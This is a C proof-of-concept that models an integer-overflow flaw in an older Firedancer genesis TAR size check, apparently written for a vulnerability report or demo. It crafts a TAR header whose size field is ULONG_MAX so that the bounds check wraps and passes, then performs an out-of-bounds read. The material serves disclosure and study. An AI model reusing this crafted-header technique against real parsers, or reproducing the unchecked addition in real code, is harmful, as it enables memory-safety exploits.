#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef unsigned char  uchar;
typedef unsigned long  ulong;

/*
   Firedancer genesis TAR size integer-overflow PoC
   ------------------------------------------------

   This is a small, standalone model of the vulnerable old Firedancer check.
   It does not build or run a full Firedancer node.  Instead, it isolates the
   exact arithmetic bug so it is easy to explain in a report or demo video.

   Vulnerable code pattern:

     actual_decompressed_sz >= 512UL + fd_tar_meta_get_size(meta)

   Intended meaning:

     "The decompressed archive must contain a 512-byte TAR header plus the full
      genesis.bin file body."

   Bug:

     fd_tar_meta_get_size(meta) is attacker-controlled through the TAR size
     field.  If it is ULONG_MAX, the unsigned addition wraps:

       512 + ULONG_MAX == 511

     The check then compares against 511 instead of the real required size.
     A tiny buffer can incorrectly pass the bounds check.

   Demonstrated impact:

     After the check passes, this PoC reads one byte past the modeled
     decompressed buffer.  AddressSanitizer reports this as a stack-buffer-
     overflow, proving the bounds check bypass reaches an out-of-bounds read.
*/

static ulong
oldgnu_tar_size( uchar const size_field[ 12 ] ) {
  /*
     TAR normally stores file sizes as octal ASCII.  GNU tar also supports a
     binary size encoding when the high bit of the first size byte is set.

     The old Firedancer path accepted that binary encoding.  This helper models
     the relevant behavior: if the high bit is set, read the next 8 bytes as a
     big-endian unsigned long.
  */
  if( size_field[0] & 0x80U ) {
    ulong x = 0UL;
    memcpy( &x, size_field+4, sizeof(ulong) );
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    x = __builtin_bswap64( x );
#endif
    return x;
  }

  ulong ret = 0UL;
  for( int i=0; i<12; i++ ) {
    if( size_field[i]=='\0' ) break;
    ret = (ret << 3) + (ulong)( size_field[i] - '0' );
  }
  return ret;
}

int
main( void ) {
  setvbuf( stdout, NULL, _IONBF, 0 );

  printf( "Step 1: create a minimal decompressed TAR-like buffer\n" );

  /*
     A TAR header is 512 bytes.  This buffer contains exactly one header plus
     only 16 bytes of fake file data.  It is intentionally much smaller than the
     malicious size we will claim in the TAR size field.
  */
  uchar decompressed[ 512 + 16 ];
  memset( decompressed, 0, sizeof(decompressed) );

  /*
     Put the expected TAR file name at the start of the header.  In the real
     Firedancer code this entry is expected to be "genesis.bin".
  */
  memcpy( decompressed, "genesis.bin", 11 );

  printf( "Step 2: craft the TAR size field as ULONG_MAX\n" );

  /*
     In a POSIX ustar header, the file size field starts at byte offset 124 and
     is 12 bytes long.  The PoC sets the OLDGNU binary-size marker and stores
     ULONG_MAX as the claimed genesis.bin size.
  */
  uchar * size = decompressed + 124; /* TAR header size field offset */
  size[0] = 0x80U;                   /* OLDGNU binary size encoding */

  ulong encoded = ULONG_MAX;
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
  encoded = __builtin_bswap64( encoded );
#endif
  memcpy( size+4, &encoded, sizeof(ulong) );

  ulong actual_decompressed_sz = sizeof(decompressed);
  ulong blob_sz = oldgnu_tar_size( size );

  printf( "Step 3: run the vulnerable size check arithmetic\n" );

  /*
     This is the bug.  The intended required size is 512 + blob_sz, but unsigned
     arithmetic wraps on overflow in C.  When blob_sz is ULONG_MAX, the result is
     511, so the bounds check incorrectly succeeds for our 528-byte buffer.
  */
  ulong vulnerable_need = 512UL + blob_sz;
  int vulnerable_check = actual_decompressed_sz >= vulnerable_need;

  printf( "actual_decompressed_sz=%lu\n", actual_decompressed_sz );
  printf( "blob_sz=%lu\n", blob_sz );
  printf( "vulnerable 512+blob_sz=%lu\n", vulnerable_need );
  printf( "vulnerable_check = actual_decompressed_sz >= 512+blob_sz -> %d\n", vulnerable_check );

  if( vulnerable_check ) {
    printf( "Step 4: enter the read path that should have been rejected\n" );

    /*
       The real parser would now trust the malicious size and continue into the
       genesis.bin processing path.  To make the memory safety issue visible in
       a small demo, read one byte past the 16-byte fake file data region.

       decompressed is 528 bytes total:
         header starts at offset 0
         blob starts at offset 512
         valid fake blob bytes are offsets 512..527
         blob[16] is offset 528, just past the buffer
    */
    uchar const * blob = decompressed + 512UL;
    printf( "vulnerable code trusts the wrapped size and enters the blob read path\n" );
    printf( "trigger one-byte OOB read under ASan: %u\n", blob[16] );
  }

  return 0;
}
